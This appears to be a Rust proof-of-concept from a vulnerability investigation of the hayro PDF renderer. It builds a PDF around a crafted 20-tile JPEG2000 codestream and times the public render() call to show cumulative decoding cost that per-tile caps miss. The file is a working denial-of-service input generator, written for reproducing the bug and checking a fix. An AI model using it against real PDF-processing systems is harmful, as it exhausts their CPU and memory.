// Standalone reproduction for candidate 013: does a codestream with many tiles - each
// individually staying under a per-`build_decompositions`-call (i.e. per-tile) cost cap like
// candidate 011's `MAX_RAW_CODE_BLOCK_ESTIMATE` / candidate 012's `MAX_RAW_CODE_BLOCK_LAYER_ESTIMATE`
// - still sum to a much larger, unbounded total cost across one `decode()` call?
//
// The pristine `base_commit` tree has *no* such cap at all (candidates 008/011/012's own fixes
// are unmerged), so this repro's "before" state already reproduces a large cost from the sheer
// number of tiles alone - the same underlying "no cap" issue candidates 008/011/012 already
// documented, just with many tiles rather than one huge one. What's specific to *this* candidate
// (documented in RESULT.md's "What was tried" table, gathered separately from this repro) is that
// applying candidate 012's own patch.diff *alone* does not fix this: each individual tile stays
// under its per-tile cap, so the cumulative cost across all tiles still reproduces unchanged.
// This repro's own patch.diff extends that cap to accumulate across the whole `decode()` call.
//
// This drives a real, on-disk-shaped PDF (classic xref table, real `/JPXDecode` image XObject,
// placed small - `cm 20 0 0 20 90 90` on a 200x200 page) through the real, unmodified, public,
// top-level `hayro::render()` entry point - the same function `hayro/examples/render.rs` itself
// calls.
//
// The embedded JPEG2000 codestream (`malicious.j2c`, 386 bytes) is a real, from-scratch,
// legitimately-parseable raw J2C codestream (SOC/SIZ/COD/QCD, then 20 real SOT/SOD tile-parts -
// one per tile) declaring a raw size of 158000x7900 (20 tiles of 7900x7900 each, the same
// per-tile shape candidates 011/012 already used, individually just under their own cap), a
// single decomposition level, the smallest legal code-block size (4x4), 1 quality layer, and a
// genuine, minimally-encoded, real non-empty packet-header bitstream per tile (not an empty tile-
// part body) so `decode()` actually runs every tile's full pipeline to completion instead of
// erroring out after the first one.
//
// Exit code convention: 0 = ran to completion (prints elapsed time and peak RSS either way -
// "reproduced" is judged by the printed numbers, not a crash/abort, since this is a DoS-via-cost
// finding, not a crash).

use hayro::hayro_interpret::InterpreterSettings;
use hayro::hayro_syntax::Pdf;
use hayro::{RenderCache, RenderSettings, render};
use std::time::Instant;

const JP2C: &[u8] = include_bytes!("malicious.j2c");

fn build_poc_pdf() -> Vec<u8> {
    let mut img_dict = format!(
        "<< /Type /XObject /Subtype /Image /Width 158000 /Height 7900 \
/BitsPerComponent 8 /ColorSpace /DeviceGray /Filter /JPXDecode /Length {} >>",
        JP2C.len()
    )
    .into_bytes();
    let mut obj4 = Vec::new();
    obj4.append(&mut img_dict);
    obj4.extend_from_slice(b"\nstream\n");
    obj4.extend_from_slice(JP2C);
    obj4.extend_from_slice(b"\nendstream");

    // Placed *small* on the page (20x20 out of a 200x200 page) so that hayro's own
    // CTM-derived downscale hint requests a small target resolution - the point being that
    // even though the *decoder* is asked for a tiny image, the codestream's raw declared
    // dimensions (independent of the hint) and its 20 individual tiles still drive the
    // vulnerable code path.
    let content: &[u8] = b"q 20 0 0 20 90 90 cm /Im0 Do Q";
    let mut obj5 = format!("<< /Length {} >>\nstream\n", content.len()).into_bytes();
    obj5.extend_from_slice(content);
    obj5.extend_from_slice(b"\nendstream");

    let objs: Vec<Vec<u8>> = vec![
        b"<< /Type /Catalog /Pages 2 0 R >>".to_vec(),
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>".to_vec(),
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /XObject << /Im0 4 0 R >> >> /Contents 5 0 R >>".to_vec(),
        obj4,
        obj5,
    ];

    let mut out = Vec::new();
    out.extend_from_slice(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n");

    let mut offsets = Vec::new();
    for (i, obj) in objs.iter().enumerate() {
        offsets.push(out.len());
        out.extend_from_slice(format!("{} 0 obj\n", i + 1).as_bytes());
        out.extend_from_slice(obj);
        out.extend_from_slice(b"\nendobj\n");
    }

    let xref_offset = out.len();
    let n = objs.len() + 1;
    out.extend_from_slice(format!("xref\n0 {n}\n").as_bytes());
    out.extend_from_slice(b"0000000000 65535 f \n");
    for off in &offsets {
        out.extend_from_slice(format!("{off:010} 00000 n \n").as_bytes());
    }
    out.extend_from_slice(format!("trailer\n<< /Size {n} /Root 1 0 R >>\n").as_bytes());
    out.extend_from_slice(format!("startxref\n{xref_offset}\n%%EOF").as_bytes());

    out
}

fn peak_rss_kb() -> Option<u64> {
    let status = std::fs::read_to_string("/proc/self/status").ok()?;
    for line in status.lines() {
        if let Some(rest) = line.strip_prefix("VmHWM:") {
            return rest.trim().trim_end_matches(" kB").trim().parse().ok();
        }
    }
    None
}

fn main() {
    let pdf_bytes = build_poc_pdf();
    println!(
        "built PoC PDF: {} bytes (embedded JPEG2000 codestream: {} bytes, declares \
158000x7900 raw across 20 tiles of 7900x7900 each, 1 decomposition level, 4x4 code blocks, 1 \
quality layer with a real minimal non-empty packet stream per tile; placed as a 20x20 thumbnail \
via `cm 20 0 0 20 90 90` on a 200x200 page)",
        pdf_bytes.len(),
        JP2C.len()
    );

    let pdf = Pdf::new(pdf_bytes).expect("PoC PDF should parse");
    let page = &pdf.pages()[0];

    let interpreter_settings = InterpreterSettings::default();
    let render_settings = RenderSettings::default();
    let cache = RenderCache::new();

    println!("calling the real, public hayro::render() and timing it...");

    let start = Instant::now();
    let pixmap = render(page, &cache, &interpreter_settings, &render_settings);
    let elapsed = start.elapsed();

    println!(
        "render() returned after {:?} (pixmap {}x{})",
        elapsed,
        pixmap.width(),
        pixmap.height()
    );

    if let Some(kb) = peak_rss_kb() {
        println!("peak RSS (VmHWM): {kb} kB (~{:.2} MB)", kb as f64 / 1024.0);
    }

    if elapsed.as_millis() >= 500 {
        println!(
            "SLOW: took >= 500ms to render a 20x20 thumbnail placement - consistent with the \
suspected cross-tile summation of a per-tile cost cap (20 tiles, each individually staying under \
the per-tile estimate)"
        );
    } else {
        println!("FAST: rendering completed quickly");
    }
}
